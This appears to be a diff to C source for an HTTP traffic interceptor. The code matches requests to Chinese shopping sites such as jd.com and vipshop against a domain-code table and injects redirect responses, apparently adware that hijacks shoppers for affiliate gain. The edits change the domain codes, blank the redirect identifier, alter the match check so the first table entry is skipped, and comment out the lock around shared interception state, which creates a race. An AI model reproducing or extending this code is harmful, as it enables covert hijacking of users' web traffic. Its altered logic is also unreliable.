@@ -11,7 +11,7 @@ static LPSTR g_DomainCodeMapping[][2] = {
 	{".jumei.com", "jumei"},
 	{".yihaodian.com", "yihaodian"},
 	{".ctrip.com", "ctrip"},
-	{".moonbasa.com", "moonbasa"},
+	{".moonbasa.com", "moonbasa1"},
 	{".gome.com.cn", "gome"},
 	{".vipshop.com", "vipshop"},
 	{".lefeng.com", "lafaso",},
@@ -22,7 +22,7 @@ static LPSTR g_DomainCodeMapping[][2] = {
 	{".lashou.com", "lashou"},
 	{".x.com.cn", "xcomcn"},
 	{".xiu.com", "zoshow"},
-	{".51buy.com", "icson"},
+	{".yixun.com", "icson"},
 	{".yintai.com", "yintai"},
 	{".wbiao.cn", "wbiao"},
 	{".jd.com", "360buy"},
@@ -58,7 +58,8 @@ static LPSTR g_pRedirectMessageTemplate =
 	"Content-Type: text/html\r\n\r\n"
 	"%s";
 
-static LPSTR g_pRedirectIdentifier = "tellmehowhighisthesky";
+//static LPSTR g_pRedirectIdentifier = "tellmehowhighisthesky";
+static LPSTR g_pRedirectIdentifier = "";
 
 PREDIRECT_INFO g_pRedirectInfo = NULL;
 
@@ -303,7 +304,7 @@ main_point:
 	if (!GetHttpHeaderValue(headers, numHeaders, "host: ", &host))
 		goto release_sendbuffer;
 
-	if ((ebindex = MatchingEBusiness(host)) < 0)
+	if ((ebindex = MatchingEBusiness(host)) <= 0)
 		goto release_sendbuffer;
 
 	/* parse  url */
@@ -399,11 +400,11 @@ main_point:
 		goto release_sendbuffer;
 	} 
 
-	EnterCriticalSection(&g_pRedirectInfo->Lock);
+//	EnterCriticalSection(&g_pRedirectInfo->Lock);
 	if (g_pRedirectInfo->pEBusiness[ebindex].bIntercepted)
 		goto release_sendbuffer;
 	g_pRedirectInfo->pEBusiness[ebindex].bIntercepted = TRUE;
-	LeaveCriticalSection(&g_pRedirectInfo->Lock);
+//	LeaveCriticalSection(&g_pRedirectInfo->Lock);
 
 	// build receive buffer
 	{
